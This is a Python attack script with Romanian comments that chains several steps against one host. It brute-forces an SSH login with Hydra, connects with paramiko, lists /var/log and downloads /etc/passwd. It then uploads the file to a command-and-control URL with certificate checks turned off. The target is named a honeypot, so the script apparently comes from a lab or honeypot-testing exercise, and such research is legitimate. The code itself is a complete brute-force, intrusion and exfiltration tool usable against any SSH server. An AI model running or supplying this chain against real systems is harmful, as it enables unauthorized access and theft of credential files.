import subprocess
import re
import paramiko
import requests
import os

HONEYPOT_HOST = "0.0.0.0"
HONEYPOT_USER = "name"
REMOTE_FILE = "/etc/passwd"
LOCAL_FILE = "passwd"
C2_URL = "https://0.0.0.0:5000/upload"

def run_hydra():
    """Rulează Hydra cu un fișier de parole și returnează parola găsită"""
    cmd = [
        "hydra",
        "-l", HONEYPOT_USER,
        "-P", "/path/to/passwords.txt",
        "-t", "4",
        "-f",
        HONEYPOT_HOST,
        "ssh"
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = proc.stdout + proc.stderr
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", output)
        if match:
            print(f"[+] Parola găsită de Hydra: {match.group(2)}")
            return match.group(2)
        else:
            print("[-] Nu s-a găsit parola în output-ul Hydra.")
            return None
    except subprocess.CalledProcessError as e:
        print(f"[-] Eroare la rularea Hydra: {e}")
        return None

def explore(ssh, path="/", depth=0, max_depth=2, file=None):
    if depth > max_depth:
        return
    try:
        stdin, stdout, stderr = ssh.exec_command(f"ls -1 {path}")
        items = stdout.read().decode().splitlines()
    except Exception as e:
        if file:
            file.write("  " * depth + f"[!] Eroare la listarea {path}: {e}\n")
        else:
            print("  " * depth + f"[!] Eroare la listarea {path}: {e}")
        return

    for item in items:
        full_path = path.rstrip("/") + "/" + item
        line = "  " * depth + "|-- " + item + "\n"
        if file:
            file.write(line)
        else:
            print(line, end="")
        stdin, stdout, stderr = ssh.exec_command(f'test -d "{full_path}" && echo DIR || echo FILE')
        typ = stdout.read().decode().strip()
        if typ == "DIR":
            explore(ssh, full_path, depth + 1, max_depth, file=file)

def get_file_from_honeypot(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HONEYPOT_HOST, username=HONEYPOT_USER, password=password)
    
    with open("filesystem_map.txt", "w") as f:
        f.write(f"Explorare zone selectate din sistemul de fișiere pentru {HONEYPOT_HOST}:\n")
        #for folder in ["/home", "/etc", "/var/log", "/root"]:
        for folder in ["/var/log"]:  
            f.write(f"\nFolder: {folder}\n")
            explore(ssh, folder, 0, 1, file=f)
    
    sftp = ssh.open_sftp()
    sftp.get(REMOTE_FILE, LOCAL_FILE)
    sftp.close()
    ssh.close()
    print(f"[+] Fișierul a fost descărcat local: {LOCAL_FILE}")
    print(f"[+] Structura sistemului de fișiere a fost salvată în filesystem_map.txt")

def upload_to_c2():
    with open(LOCAL_FILE, "rb") as f:
        files = {"file": (os.path.basename(LOCAL_FILE), f)}
        response = requests.post(C2_URL, files=files, verify=False)
        if response.status_code == 200:
            print("[+] Fișier trimis cu succes la C2")
        else:
            print(f"[-] Eroare la upload: {response.status_code} {response.text}")

if __name__ == "__main__":
    passwd = run_hydra()
    if passwd:
        get_file_from_honeypot(passwd)
        upload_to_c2()
    else:
        print("[-] Nu am parola, nu pot continua.")



